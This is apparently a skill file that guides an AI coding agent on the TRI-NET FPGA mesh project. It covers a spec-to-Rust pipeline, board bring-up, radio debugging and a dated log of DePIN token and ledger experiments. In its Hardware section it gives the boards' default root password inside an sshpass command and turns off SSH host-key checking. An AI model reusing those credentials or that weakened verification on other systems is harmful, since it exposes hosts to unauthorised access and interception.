# Skill: tri-net-development

## Description
Complete development workflow for the TRI-NET FPGA mesh communication project (github.com/gHashTag/tri-net). Covers spec-first golden pipeline, hardware bring-up, security auditing, and autonomous development loops.

## When to Use
- Working on TRI-NET (tri-net repo) or trios-mesh implementation
- Writing .t27 specifications and generating Rust via t27c
- P201Mini board bring-up (Zynq 7020 + AD9361)
- Mesh network debugging and security auditing
- Writing specs for new features (ALWAYS before implementation)

## Core Rules (NON-NEGOTIABLE)

### Golden Pipeline (Article II)
```
specs/*.t27 -> t27c parse -> t27c gen-rust -> gen/rust/*.rs -> src/lib.rs
```
- **NEVER write .rs files by hand for business logic** (L6 violation)
- **NEVER edit files under gen/** (L2 violation)
- **ALWAYS write .t27 specs FIRST**, then generate
- src/bin/ and tools/ are ALLOWED to have logic

### Repository Structure
- **tri-net** (github.com/gHashTag/tri-net): THE repo. Specs, generated code, docs, tools.
- **trios-mesh** (github.com/gHashTag/trios-mesh): Runtime implementation crate (historical, pre-pipeline)

### t27c Compiler Location
```bash
export T27C=~/Desktop/PROJECTS/CLAUDE/t27/target/release/t27c
$T27C parse specs/foo.t27    # typecheck
$T27C gen-rust specs/foo.t27  # generate Rust -> stdout
```

### .t27 Format Key Patterns
- Module: `module Name { use base::types; ... }`
- Constants: `const NAME: u8 = 5;`
- Functions: `fn name(args) -> ret { ... return x; }`
- Mutable locals: `let x: u8 = 0; x = x + 1;`
- Tests: `test name { assert(cond, "msg"); }` or `test name given x = f() then x == y`
- Invariants: `invariant name assert COND`
- **No bool let bindings** (t27c can't generate them) — use u8 (0/1) instead
- **No byte arrays** — model as integer functions (header_byte(idx))

### Hardware (SOUL.md Article IV)
- Cold power cycle only (warm reboot hangs Zynq PS)
- SD boot is primary path (bypasses QSPI POR issue)
- UART: FT2232H channel B (NOT A), 115200 8N1, root/analog
- Boot switch position is IRRELEVANT for SD boot
- SSH: `sshpass -p analog ssh -o PreferredAuthentications=password root@192.168.1.1N`
- Boards get reflashed -> host keys change. Add `-o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null`. Quote EACH `-o` separately (an unquoted
  options variable breaks ssh parsing). No scp server on busybox: upload with
  `cat f | ssh ... 'cat > /root/f && chmod +x /root/f'`.

### TRAP: "just reflash it" (added 2026-07-17)
A board whose AD9361 is missing is NOT a flashing problem until proven so.
Measured on .11 (no radio) vs .12 (radio): **all four QSPI partitions**
(fsbl-uboot, uboot-env, nvmfs, qspi-linux = kernel+dtb+bitstream), the SD
(BOOT.BIN, devicetree.dtb), the 54-var u-boot env, and the live DT
(`adi,ad9364`, `2rx-2tx`, 40 MHz refclk) were **byte-identical**. Reflashing
identical bytes is a no-op that only risks the POR damage in Article IV.
- `ad9361_probe : enter` then `Division by zero` in `ad9361_rx_adc_setup` = the
  driver read a ZERO clock rate. With identical firmware that is PHYSICAL.
- **Radio state is not stable across power events**: .13 went from `xadc`-only to
  the full AD9361 stack with zero software change. ALWAYS re-measure the
  inventory before concluding. `reboot` does not reset the RF power domain — only
  a cold cycle clears a latched XO.
- Radio inventory check (do this FIRST):
  `ls /sys/bus/iio/devices/*/name | xargs cat` -> need `ad9361-phy`;
  `dmesg | grep -E "successfully initialized|Calibration TIMEOUT|Division by zero"`.
  A Calibration TIMEOUT means marginal, not healthy. **Two** healthy nodes are
  required for a link (SOUL Article V). OTA needs human confirmation; cabled
  (SMA + 30-40 dB attenuator) or simulated only.

### Debugging Doctrine (Article VIII)
1. Independent channel first (UART before network diagnosis)
2. Observability before mutation (read before write)
3. RTFM before reverse-engineering
4. Enumerate hypothesis classes (hardware/config/network)
5. Identity before shared medium (grep ethaddr)

## Feature Areas

### Specs by Domain (94 total)
- PHY: channel_t/p/v_modem, fpga_bpsk_tx, csma_timing
- FEC: reed_solomon, viterbi_k5, crc16
- Crypto: aes256_gcm, lite_crypto, key_management, trng
- Chat: chat_protocol, codec2_voice, pq, padding, store
- Routing: etx, mesh_routing, mesh_convergence, olsr
- Network: wire, tun, gateway, qos_scheduler, nat_traversal, mesh_metrics
- Link: link_budget, link_negotiation, link_quality_monitor
- System: health_monitoring, self_healing, fault_detection, production_deployment

### Daemon Environment Variables
```
TRIOS_TUN=1       IP-over-mesh (TUN device)
TRIOS_GATEWAY=1   Internet gateway for mesh
TRIOS_QOS=1       Priority scheduling
TRIOS_QPSK=1      QPSK modulation (2x throughput)
TRIOS_FEC=1       Viterbi FEC (100x fewer lost frames)
TRIOS_SCAN=1      Auto-scan clean channel
TRIOS_SEND=D:msg  Send text message
TRIOS_SENDFILE=D:path  Transfer file
TRIOS_FETCH=GW    Fetch internet via gateway
TRIOS_KEY=path    Real identity key (not derived)
TRIOS_TXGAIN=-12  TX gain for poor-isolation nodes
TRIOS_FREQ=hz     Fixed channel frequency
```

### Cross-Compile
```bash
brew unlink rust  # Homebrew shadows rustup
cargo zigbuild --release --target armv7-unknown-linux-musleabihf
```

### Key Scientific References
- ETX: Couto et al., SIGCOMM 2003
- CSMA: Bianchi, IEEE J-SAC 2000
- RS erasure: Bloemer et al., ICPP 1995
- Ratchet: Cohn-Gordon et al., IEEE S&P 2017
- PQXDH: Signal IETF draft + NIST FIPS 203
- Phase tracking: Mengali & D'Andrea, Springer 1997

## Common Mistakes (AVOID)
1. Writing Rust directly instead of .t27 specs
2. Writing to trios-mesh instead of tri-net
3. Using bool let in .t27 (use u8 0/1 instead)
4. Forgetting test/invariant blocks (L4 violation)
5. Committing non-ASCII characters (L3 violation)
6. Creating .sh/.py scripts (L7 violation)

## TRAP I: Vendor-Reference Anchor (hardware bring-up)

**The deadliest anchor in hardware bring-up:** using a reference design from the
WRONG FPGA vendor for the SAME peripheral module.

**Real case (2026-07-12, 20 hours lost):** AX7203 (Xilinx Artix-7) + AN430 LCD.
The AN430 ships with an Altera/Cyclone IV demo (`sd_sdram_lcd`, Quartus 2015).
Copied its timing logic verbatim. Three differences caused white screen for 20h:

| Setting | Altera demo (WRONG) | ALINX Xilinx demo (CORRECT) |
|---------|--------------------|-----------------------------|
| DCLK | `assign lcd_dclk = clk_clk` | `assign lcd_dclk = ~lcd_clk` |
| HSYNC/VSYNC | `assign lcd_hsync = 1'bz` | `assign lcd_hsync = hsync_r` |
| H_BackPorch | 45 | 2 |

One character (`~`) cost 20 hours. Vendor conventions for clock polarity and
sync signaling DIFFER. Altera non-inverted + high-Z; Xilinx inverted + active.

**Countermeasure:** Before iterating ANY hardware parameter, find a WORKING
reference design for the EXACT same FPGA family + peripheral combination.
GitHub `alinxalinx/AX7103` had `08_lcd_test` with correct values all along.
A single working `.bit` from the vendor eliminates entire hypothesis classes.

**Anti-pattern that extends debugging 10×:** iterating the search space you
THINK is wrong (pin mapping: 8 permutations) while the real bug is in a
dimension you never tried (clock polarity from wrong reference).

## REALM-CHECK DISCIPLINE (v1.5 — added 2026-07-13)

Before reporting numbers (compile errors, test counts, cargo verdicts) from
a local workspace, **always cite the full context**, not just the repo SHA:

1. **Host identity** — machine name or hostname
2. **Binary sha256** — `shasum -a 256 target/release/t27c` (or equivalent)
3. **Working tree state** — `git status --short` (clean? uncommitted? staged?)
4. **Exact command** — verbatim invocation that produced the number
5. **Repo SHA** — `git rev-parse HEAD`

Without all five, a reviewer in a different workspace cannot reproduce the
number and must treat it as a claim, not a measurement.

**Self-caught example (2026-07-13):** Three times in one session, numbers
from one workspace (macbook, 114-commits-ahead branch) were presented as
facts and caught by realm-check in another workspace. Pattern: stale binary
built from uncommitted working tree, branch divergence masked as "master",
cached build artifacts. Cost: ~40 minutes per incident to reconstruct
conditions. The fix is the 5-point citation above.

**Anti-anchor pattern #5 (overclaim source):** "cargo check gives 0 errors"
without binary sha256 + working tree state is a claim, not a measurement.
A reviewer who cannot reproduce it will (correctly) reject it.

## MEASUREMENT-SCOPE-MISMATCH (v1.5 — added 2026-07-13)

When two careful people measure the "same" thing and get wildly different
numbers, the cause is almost never "one is wrong" or "the system is too
complex." It is almost always **scope mismatch** — they measured with
different sets of fixes applied, different branches, or different modules
wired in.

**Self-caught examples (2026-07-13 cascade debugging):**

1. "let; regression on master" — I measured with 2 optimizer fixes applied,
   investigator measured with 3. Same commit SHA, different **uncommitted
   working tree**. My 275 errors was correct for my fix set; his 28 was
   correct for his. Neither was wrong — they measured **different scopes**.

2. "141→0" — real, but only on a branch with 114 commits containing all
   optimizer fixes together. On origin/main it was 4→4 (gen/rust already
   clean). Same repo, same spec files, different **branch context**.

3. "26 vs 28 errors" — same commit, same t27c, but macOS arm64 vs linux.
   Binary sha256 diverges (platform-specific codegen). ±2 count is platform
   noise, not a bug. **Binary sha is NOT a cross-env fingerprint** — use
   commit SHA + cargo output count ± epsilon instead.

**Rule:** When numbers disagree, before arguing about correctness, list
explicitly: (a) which fixes/patches are applied, (b) which branch, (c)
which modules are wired in lib.rs, (d) platform + toolchain version.
The disagreement almost always dissolves once scope is made explicit.

## REALM = COMMAND + SCOPE + POLICY (v1.6 — added 2026-07-13)

A "realm" is defined by THREE independent axes. Any difference in any
axis means the two measurements are in **different realms** and cannot
be directly compared:

1. **Command** — `cargo check` vs `cargo clippy` vs `cargo build`
2. **Scope** — `--lib` (library only) vs `--all-targets` (lib + bins + tests + benches)
3. **Warning policy** — default (warnings allowed) vs `-D warnings` (warnings = errors)

**Self-caught example (2026-07-13):** Optimizer fix'ы измерялись with
`cargo check --lib` (no `-D warnings`) = 26 errors. CI uses `cargo clippy
--all-targets -- -D warnings` = 424 errors. Both measurements were correct
in their own realm. The fix'ы worked (E0384/E0425 eliminated), but CI
requires clippy-clean codegen output — a different problem entirely.

**Rule:** Before claiming "CI will pass" or "N errors", state all three:
`(command, scope, policy)`. "26 errors" is meaningless without
"`(cargo check, --lib, default)`" attached.

phi^2 + phi^-2 = 3 | TRINITY

## THE PHONE APP (`phone/`) — added 2026-07-17

**The macOS product is TriNetMonitor: THREE tabs — Network | RTI Heatmap | Video
Call** (`TriNetMonitor.swift`). That shell IS the product. Never ship a
single-view build, never drop a tab. Regressions here are the most visible kind.

- `desktop/project.yml` lists sources explicitly -> add new files there, then
  `xcodegen generate`. Safe for the Mac (`CODE_SIGN_IDENTITY: "-"`).
- The **iOS target compiles a STATIC file list — never regenerate it** (it breaks
  signing: "No Account for Team"). Embed shared types into existing files
  (MeshCrypto, DS, BackgroundBlur, OpusCodec all live inside VideoPipeline.swift).
- **Launch with `open -n /Applications/TriNetMonitor.app`.** Running the binary
  directly (`.../Contents/MacOS/TriNetMonitor`) yields a process with NO WINDOW —
  it looks exactly like the app was deleted. Logs no longer justify that trick:
  `LogBus` tees stderr into the in-app Log pane.

### Media invariants (each was a real, shipped bug)
| Rule | Why |
|---|---|
| Audio datagram < `maxPayload` (1200B) — slice the tap to 20ms/320 samples | the tap returns ~100ms device buffers -> 3200B -> silently fragmented |
| Never raw PCM on a constrained link | 16k x 16bit = 256 kbps EACH WAY; Opus = 63B/20ms = 24.7 kbps and fits the mesh 70B fragment |
| Observe `AVAudioEngineConfigurationChange` (+ iOS interruption/route/mediaServicesReset) and rebuild | the engine stops and drops EVERY tap; mic died ~200ms in, forever |
| `installTap(format: nil)` | a format read before voice processing settles is stale — that race IS the 200ms death |
| `0xFA` is reserved for framing; drop unknown subtypes | handing unknown magic to the H.264 decoder caused a PLI/keyframe storm |

### Verification (no two-endpoint rig exists)
- Prove codecs with a standalone `swiftc` harness that round-trips through
  **naked wire bytes** — buffer-to-buffer hides packet descriptions and passes
  when the real path would return silence.
- Verify UI in the iOS Simulator (`simctl io <id> screenshot`), never edit layout
  blind. Control bars: equal-width `maxWidth: .infinity` cells, <=6 primary
  buttons (fixed widths overflow small phones).
- **Never call a wire change "backward-compatible" without testing a REAL old
  peer.** Gate new formats OFF until both ends run the new build.

## THE INVESTOR PITCH ARTIFACT (keep it current) — added 2026-07-18

There is ONE living pitch page for TRI-NET. It is in Russian, self-contained
HTML, and its source of truth lives in the repo:

- **Source:** `docs/pitch/tri-net-pitch.html`
- **Published (stable) URL:** https://claude.ai/code/artifact/2d7ed62c-592f-45a0-867c-2b76ebb6627a

**After any milestone that changes what the project can claim** (a new hardware
result, a corrected number, a boundary crossed or newly honest), UPDATE this
pitch — do not create a second one:

1. Edit `docs/pitch/tri-net-pitch.html` (Russian text; keep the existing design
   system, CSS variables, and both light/dark themes intact).
2. Republish to the SAME URL: call the Artifact tool with
   `file_path` = the repo file (or copy it to the session scratchpad first and
   publish that), and pass `url: "https://claude.ai/code/artifact/2d7ed62c-592f-45a0-867c-2b76ebb6627a"`
   so it redeploys in place instead of minting a new link. Keep the `📡` favicon
   and a stable `<title>` across redeploys.
3. Commit the source change to the repo.

**Rules for the pitch content:** every number must be a real, verified result
(no projections stated as facts); keep the honest "What is NOT done" section
current -- it is a feature, not a weakness, for a technical/investor audience;
mirror the milestone tables in `fpga/ternary/nn/on_chip/README.md` and the
`fpga/ternary/README.md` headline table. When a claim in the repo docs changes,
the pitch changes with it.

## STRATEGIC CONTEXT: SSI / IEC 61499 / ITU-T Network 2030 (added 2026-07-18)

TRI-NET is not just a drone-mesh -- it is a working silicon instance of the
compute+telecom convergence that a real Russian government track is asking for.
This context frames every milestone; keep it in mind when reporting or planning.

**The external opportunity.** A.L. Balyberdin (rutel@mail.ru, Novosibirsk,
Verilog/FPGA engineer) is building a DataFlow compute paradigm + deterministic
network for ITU-T SG-13 "Network 2030" and sovereign open ACS/APCS (АСУ ТП).
A signed PAO Rostelecom letter (RF gov order 3339-P) makes him an EXPERT in the
inter-industry working group for a sovereign OPEN industrial-control data bus (OCF)
-- with Rostelecom, NPC Elvis, Exara Group and others, under ITU-T SG-13, ISO/IEC
29181, GOST 58210. He specs an ASU_TP_SOM module: RISC-V compute + 4-port SSI
network controller + 80 programmable I/O pins on one 50x30mm module, IEC 61499
function blocks, ternary {0, 1, no-data} semantics, "wave of detonation" over a
mesh with per-node local memory (no RAM bottleneck), all sovereign + open.

**Why it maps 1:1 to what we built.** The week's tri-net work IS a hardware
instance of that paradigm: one Zynq-7020 = his ASU_TP_SOM (compute + radio/mesh +
PL I/O on one die); ternary sign-select {-1,0,+1} 0-DSP MAC = his {0,1,no-data}
firing rule; systolic wavefront + BER=0 DSSS link + Costas/timing recovery = his
SSI deterministic channel + FIFO+PLL clock recovery (ADC->DAC scenario);
weight-stationary PEs = his "no RAM bottleneck"; AI-driven CSMA MAC = IEC 61499
event-triggered function block; fully OPEN FPGA flow (no Vivado) = the sovereignty
requirement, with the loadable PS7 bitstream proving SoM-class integration.

**The living brief** (Russian): docs/integration/tri-net-asutp.html ->
https://claude.ai/code/artifact/3db909af-a869-45a1-9a8c-da9dbb565962 -- update it
(same-URL republish) when a milestone changes a parallel or number, same rule as
the pitch. We hold the ALU/radio/AI + open-flow + reproducibility layer; he holds
the SSI network fabric + the polyhedral "large-cycle extraction" math (his stage 5,
5+ years). Complementary, NOT a code merge -- "100% integration" = the parallels +
concrete bridges + plan in the brief, plus buildable pieces (semantics bridge,
ADC->DAC clock recovery on our timing-recovery path, AI over SSI). Never send email
or make external commitments on the user's behalf.

**$TRI DePIN + the 6G framing (added 2026-07-18).** The user's thesis: TRI-NET is a
DePIN -- node holders earn a $TRI token for real physical work (relaying mesh
traffic over the radio), Helium Proof-of-Coverage style. The on-node substrate is
`specs/tri_depin.t27` (Proof-of-Relay): a tamper-evident / order-sensitive / size-
bound / identity-bound / epoch-bound accumulator over forwarded-packet receipts,
from which a settlement layer mints $TRI. Multiply-free (T27 has no `*`) xorshift+
shift-add mixer. 14 invariants; seal diffusion 15.91/32 bits. The seal BINDS
total_bytes (a wave fix -- otherwise a node presents an honest acc/seal but claims
inflated bytes, since reward is paid on total_bytes). **Proven on real hardware
(2026-07-18, smoke/DEPIN_RELAY_HW_2026-07-18.md):** an armv7 musl meter (t27c
gen-rust in a thin wrapper, cargo zigbuild) run on node .12 mints a receipt over a
real file; x86 host and a 2nd ARM node (.13) recompute the seal BIT-EXACT;
byte-inflation and 1-byte content tamper both rejected. Cross-arch bit-exactness is
the settlement property. **This is accounting
logic, so it MUST live in a `.t27` spec through the golden pipeline -- never hand-
write it in Rust/Python (repo law + the `no-handwritten-logic` hook enforces it).**
Verify pattern (no `.sh` -- the `no-shell-scripts` hook forbids new shell scripts):
`t27c gen-rust specs/<x>.t27 > g.rs`, append Rust `#[test]` mirrors of the spec's
test blocks, `rustc --test -O g.rs` (release = production wrapping semantics), run.
Honest 6G answer: ITU-**R** IMT-2030 (Jun 2023) has 6 scenarios; TRI-NET fits 3
directly -- Integrated Sensing & Communication (our RF-sensing/RTI), AI & Communi-
cation (on-node AI), Ubiquitous Connectivity (mesh) -- and Hyper-Reliable Low-
Latency partially (deterministic clkrec). ITU-**T** SG-13 does the network
architecture side (Network 2030). The $TRI token and open sovereign flow are a
COMPLEMENTARY layer on top of the standard, NOT part of the standard -- say so; do
not claim the token is "in 6G".

**$TRI A+B+C proven on hardware (2026-07-18b, smoke/DEPIN_ABC_HW_2026-07-18.md).**
(A) Real network relay: node .13 serves the payload via `busybox httpd`, node .12
fetches over the wired net via `wget` and meters the received stream -- the boards
have NO `nc`/`socat`/python/`/dev/tcp`, only `wget`+`httpd`, so HTTP is the only
board-to-board transport. (B) `epoch_seal` is signed with Ed25519 (ed25519-dalek,
cross-compiled armv7 musl); verifiers use the PUBLIC key only (no shared secret).
Ed25519 is a crate PRIMITIVE (fine, like the mesh's ChaCha/X25519) -- the seal it
signs is still t27. (C) `specs/tri_settle.t27`: round aggregation + proportional
pool split (u64, floor div => no over-issuance), 8 invariants. Next real step:
the RF/over-the-air leg (raise the .13->.12 radio link, meter what the radio
forwarded) and wiring into the live mesh daemon; secure key storage; on-chain
issuance. Board hygiene: after httpd, `killall httpd` misses it (busybox name is
`busybox`) -- kill by pid; always leave TX LO pd=1.

**Lossy-channel integrity gate + real RF measurement (2026-07-18c,
smoke/DEPIN_LOSSY_RF_2026-07-18.md).** Weak point: over radio the forwarded bytes
carry bit errors, so a bit-exact receipt punishes honest relays and can't tell a
channel error from cheating (lossy decode-and-forward relay problem). Fix in
`tri_depin.t27`: `relay_absorb_verified` / `bytes_add_verified` -- meter a datagram
only if its recomputed digest matches the carried digest; drop corrupt ones. 18
invariants; `relayfec` mode on node ARM: BER0 -> receipt matches clean, BER1000ppm
-> corrupt datagrams dropped, only verified bytes metered. **RF measurement recipe
(works):** streaming devs `cf-ad9361-lpc` (RX) / `cf-ad9361-dds-core-lpc` (TX,
iio:device2). Noise floor: `iio_readdev -s 8192 cf-ad9361-lpc voltage0 voltage1 > f`,
pull raw (NO grep -- corrupts binary), RMS in numpy. Tone: TX board set TX LO,
`out_altvoltage1_TX_LO_powerdown=0`, DDS `out_altvoltage0_TX1_I_F1_{frequency,scale,
raw}` + `out_altvoltage2_TX1_Q_F1_*` (raw=1 enables). Measured .13->.12 = 47.4 dB SNR
(BER~0). ALWAYS after: DDS raw=0 + TX LO pd=1 on the TX board (retry -- .13 flakes on
dropbear). Next: full OTA byte transfer through the modem; pair the gate with the
repo's interleaved XOR-FEC to recover (not just drop) corrupt datagrams.

**FEC recovery + quality-weighted reward + OTA attempt (2026-07-18d).** B:
`specs/tri_fec.t27` -- XOR single-erasure recovery (parity XOR survivors, re-checked
by digest); `relayfec2` mode recovers one corrupt datagram per K=4 group instead of
dropping (ARM @ 50 permille BER: recovered 3). C: `tri_settle.t27` gains
link-quality-weighted reward (contribution = bytes*quality from SNR, Helium-class
PoC). **t27c codegen bug found + worked around:** a `u64 == <literal>` compare is
NARROWED to u32, so `weighted_total == 0` misreads any 2^32 multiple as zero -- test
both u32 halves (`(x>>32) as u32`, `x as u32`) instead; verify by reading the
generated Rust, not just the green tests. A (OTA modem): built + loopback-validated
(BER=0) a CFO-immune differential-BPSK demod, but the live link failed -- root-caused
by frame-period autocorrelation ~0.03 (should be ~1), so `iio_writedev -c` is NOT
putting the periodic frame on air (TX-cyclic bring-up, not the DSP). **Frame-period
autocorrelation is the TX-liveness check before blaming the demod.** Naive rect DBPSK
is the wrong tool through the AD9361 filters anyway; use the PL DSSS PHY (Loop24,
BER=0). See smoke/OTA_MODEM_ATTEMPT_2026-07-18.md.

**Interleaver + OTA subcarrier (2026-07-18e).** `specs/tri_ilv.t27` -- depth-D block
interleaver (`ilv_tx_pos`/`ilv_orig`/`ilv_codeword`) spreads consecutive datagrams
across D codewords so a fading burst <=D leaves <=1 error per codeword -> single-
erasure FEC recovers. `relayfec3` on ARM, burst=8: no-interleave 48/64 vs interleaved
64/64. OTA modem findings (smoke/DEPIN_INTERLEAVE_OTA_2026-07-18.md): the AD9361
BLOCKS DC, so rectangular DBPSK near baseband dies -- put data on a **768 kHz
subcarrier** (= 1 cycle/symbol = fs/OSF, transparent to the OSF-lag differential
detector); loopback through a simulated DC-notch gives BER=0. Band is CLEAN here (TX
off -> RX RMS 7). Still blocked: RX data frame non-periodic (autocorr ~0.03 at frame
length despite matched 30.72 MHz rates) = a TX buffer-playout issue (AD9361 TX-chain
interpolation/FIR, or iio_writedev streaming underrun), NOT the DSP. **Diagnostic
that cracked it: a TONE proves nothing about buffer periodicity (a tone is periodic
at any buffer); use a DATA signal + frame-period autocorrelation, and a TX-OFF
capture to rule out ambient interference.** Next: AD9361 TX FIR/rate config, or the
PL DSSS PHY.

**Live SNR->reward + OTA further diagnosis (2026-07-18f).** C-live
(smoke/DEPIN_LIVE_SNR_REWARD_2026-07-18.md): measured real link SNR on .13->.12 (tone
+ iio_readdev: 34 dB @ TX -10, 5 dB @ TX -50) and ran the verified chain
`snr_to_quality`->`reward_weighted` (tri_settle.t27, 17 invariants) on node .12 ARM --
same 10000 bytes, strong link earns 939 $TRI, weak 60, dead (2 dB) 0. Helium-class
Proof-of-Coverage live. **t27c i32 narrowing bug (again):** a signed `i32 <=` compare
is narrowed to u32, so a negative dB would read as huge and pay a dead link -- keep
SNR inputs UNSIGNED (caller clamps <0 to 0). Same family as the u64==0 bug; read the
generated Rust. OTA (A) further diagnosis, STILL not closed: ruled out streaming gaps
(single contiguous -b 61440 buffer -> autocorr still ~0.01) and RX adaptive tracking
(bbdc/rfdc/quadrature off -> no change). Band clean, signal strong (~48 dB), demod
loopback-proven -- the RX data frame just isn't periodic at the frame length, so it is
a TX-datapath sample-mapping issue (AD9361 TX interpolation/FIR, weak spurious autocorr
peak at 3072 ~ 5120*0.6 hints at resampling). Closing needs AD9361 TX-chain config
reverse-engineering or the PL DSSS PHY -- stop hammering it; deliver elsewhere per the
debugging doctrine.

**Full DePIN round + adaptive depth (2026-07-18g,
smoke/DEPIN_ROUND_ADAPTIVE_2026-07-18.md).** C: `round` mode ran a full multi-node,
multi-epoch payout on node .12 ARM over three REAL measured links (.13->.11/.12 at TX
-10/-30/-50 => 34/18/6 dB): node0 60000B@34dB->713 $TRI, node1 45000B@18dB->258, node2
24000B@6dB->27, paid<=pool. B: `tri_ilv.t27` gains `choose_depth(max_burst)` (clamp
DEPTH_CAP=64) + `depth_survives`; relayfec3 burst=12 -> fixed D=8 accepts 48/64,
adaptive D=12 accepts 48/48. **A stays flash-gated:** the OTA close needs the PL DSSS
PHY (destructive flash + user presence) or AD9361 TX-datapath RE; do NOT keep
attempting host modems (same TX non-periodicity). When the user says "прошивай" AND is
at the board: stage the DSSS bitstream, cold-cycle per Art IV.

**Merkle commitment + 3-node relay + OTA config-read (2026-07-18h,
smoke/DEPIN_MERKLE_RELAY_2026-07-18.md).** B: `specs/tri_merkle.t27` -- a Merkle
commitment over the payout round (Helium model: publish one root, claim a reward by an
inclusion proof; forged reward + wrong sibling rejected; tamper-evident root). depth-3
8-leaf unrolled (t27 has no loops); 6 invariants. `merkle` mode on node .12 ARM: root
0x12CE67F1, node0 proof VALID, forged 999999 $TRI REJECTED. C: live 3-node relay
.11->.12->.13 over HTTP (httpd+wget) -- both relay receipts bit-exact (acc 0xBB6CEDC1).
A: RTFM config-read ruled out configured resampling (TX/RX/DDS all 30.72 MHz, FIR
off) -- OTA non-periodicity is DMA/buffer-level, not a rate/FIR resample; still
flash-gated. **Lesson: `grep -E "iio_"` matched the system daemon `iiod` and killed it
(restarted `/usr/sbin/iiod -D -n 3 -F /dev/iio_ffs`); use `[i]iod` near system procs.**

**Persistent $TRI ledger (2026-07-18i, smoke/DEPIN_LEDGER_2026-07-18.md).** Weak
point: per-round settlement + Merkle round-root are stateless (no lasting balance
record). `specs/tri_ledger.t27`: `balance_add` (saturating accumulation) +
`state_step(prev, round_root, epoch)` chains each round's Merkle root into an evolving
ledger STATE ROOT (blockchain-style, order-sensitive, tamper-evident) + `verify_chain3`.
6 invariants. `ledger` mode on node .12 ARM, 3 rounds (round0 = the real 0x12CE67F1
Merkle root): balance 713->1403->2108 $TRI, state root 0x64102268; tampering round0 ->
0x885A0E62 (caught). The full DePIN chain is now on silicon: signed Proof-of-Relay
receipt -> integrity gate + FEC + interleaver -> SNR-weighted payout -> Merkle round
root -> append-only ledger state chain. Next non-blocked steps: account-state Merkle
tree with per-node inclusion proofs; slashing (bond forfeited on a mismatched receipt).

**Account proof + slashing (2026-07-18j, smoke/DEPIN_ACCOUNT_SLASH_2026-07-18.md).**
B: `tri_merkle.t27` gains `account_leaf(node_id, balance)` -- the ledger state is a
Merkle tree over balances; a node proves its OWN $TRI with an inclusion proof (account
mode on .12 ARM: root 0x7268C646, proves 2108, forged 999999 rejected). C:
`tri_slash.t27` -- bond + `settle_or_slash` (honest +reward; mismatched receipt -> bond
forfeited, saturating at 0), 6 invariants (slash mode on ARM: honest 1713, cheat 900 <
1000). **The full DePIN stack is now on t27+ARM:** signed Proof-of-Relay receipt ->
integrity gate + FEC + interleaver -> SNR-weighted payout -> Merkle round root ->
append-only ledger state chain -> Merkle account (balance proof) -> bond/slashing.
A: dmesg on .12/.13 shows NO DMA underrun/overflow -> OTA non-periodicity is a SILENT
sample-mapping/timing issue, not a loud underrun (with config-read: all 30.72 MHz, FIR
off). Still flash-gated; stop attempting host modems.

**Challenge game + canonical claim (2026-07-18k,
smoke/DEPIN_CHALLENGE_CLAIM_2026-07-18.md).** C: `tri_challenge.t27` -- decentralized
dispute (no trusted settler): any node challenges another's receipt, anyone re-meters
the stream for truth, the loser forfeits its bond to the winner. 6 invariants.
`challenge` mode on .12 ARM: lying defender slashed 100->0 (challenger 100->200), honest
defender wins. B: `claim` mode emits the canonical on-chain claim (state_root +
node_id/balance/idx + Merkle proof) a contract consumes -> ACCEPT mints 2108 $TRI.
**HONEST: the hash is mix32; a real Solana/EVM chain needs sha256/keccak -- implementing
sha256 in t27 (all u32 add/rot/xor/shr, no multiply; 64 rounds unrolled, no loops/arrays
so ~hundreds of lets) is the dedicated next step.** t27c LESSON: gen-rust SILENTLY DROPS
tuple-returning functions (typecheck passes, fn absent from gen) -- split into scalars;
verify by counting `pub fn` in gen output. A: OTA still flash-gated (no radio this wave).

**SHA-256 in t27 + on-chain verifier (2026-07-18l,
smoke/DEPIN_SHA256_ONCHAIN_2026-07-18.md).** B (flagship): `specs/tri_sha256.t27` -- a
REAL SHA-256, single 512-bit block, fully unrolled (t27 has no loops/arrays; one
function computes all 8 H words, returns `which`). Pure u32 add/rot/xor/shr, no
multiply. Verified BIT-EXACT vs sha256("abc") (all 8 words) through the golden pipeline.
768 lines, authored via a one-shot text generator (scratchpad/gen_sha256.py -- NOT
committed; the .t27 is the artifact). C: `sha256demo` runs the real SHA-256 on node .12
ARM (sha256("abc") correct; sha256-Merkle parent matches a python reference; inclusion
proof VALID, forgery REJECTED). Reference contract: `docs/onchain/verify_claim.md`
(Anchor/Rust; Solana computes sha256 natively; EVM uses keccak256 -- same structure).
DePIN stack is now chain-ready end-to-end. Last integration step: widen the on-node
Merkle from 32-bit mix32 nodes to 256-bit SHA-256 nodes (primitive is ready). A: OTA
flash-gated. NOTE: .13's TX LO was found powered up at wave end (reset?) -- always
re-check ALL boards' TXpd at cleanup, not just the ones you touched.

**OTA CLOSED -- byte over the air, BER=0 (2026-07-18m,
smoke/DEPIN_OTA_CLOSED_2026-07-18.md).** The flagship is done NON-DESTRUCTIVELY (NO PL
FLASH) with the host DBPSK modem. Two 8-byte payloads TX'd .13->.12 at 2.4 GHz, both
BER=0; single-board loopback BER=0 too. **ROOT CAUSE of ALL prior OTA failures: RX
OVERRUN.** A large `iio_readdev -s 131072` overruns the PS's RX DMA drain (30.72 MSa/s
too fast to keep up); dropped samples destroy the data frame's periodicity, while a
narrowband TONE survives -- which is why tones always "worked" and data never did.
Found by elimination: ruled out cross-board clock offset (single-board loopback fails
identically), chunk gaps/cyclic boundary (one `-b 102400` transfer fails), and PROVED
buffer TX works (1 MHz tone -> 1.001 MHz, 82% power). **THE FIX / RECIPE:** TX
`iio_writedev -c -b 5120 cf-ad9361-dds-core-lpc voltage0 voltage1 < frame.iq` (kill any
prior writer + `sleep 1` first -- stale DMA breaks the next TX); RX `iio_readdev
-s 16384 -b 16384 cf-ad9361-lpc voltage0 voltage1` -- **SMALL buffer to avoid overrun**
(THE whole bug); DBPSK on a 768 kHz subcarrier (fs/OSF, survives the DC-block);
differential demod + PN-preamble correlation. The PL DSSS flash is NO LONGER required
to demo OTA; the whole DePIN chain can run over real radio. Next: long streams /
throughput; hardened on-node modem.

**RADIO-DePIN LOOP ON THE NODE + throughput + BER curve (2026-07-18n,
smoke/DEPIN_RADIO_RECEIPT_2026-07-18.md).** The OTA link is now wired to the DePIN
stack ENTIRELY on the node ARM -- first fully-radio DePIN on silicon. Ported the host
DBPSK demod to Rust (`relay_meter otarx <key> <epoch> <nbytes>`, BER=0 vs the Python
reference): `iio_readdev -s 16384 -b 16384 cf-ad9361-lpc voltage0 voltage1 | relay_meter
otarx ...` on .12 captures the air, demods (BER=0), and mints the t27 tri_depin
Proof-of-Relay receipt over the RADIO-delivered bytes -- no host in the loop.
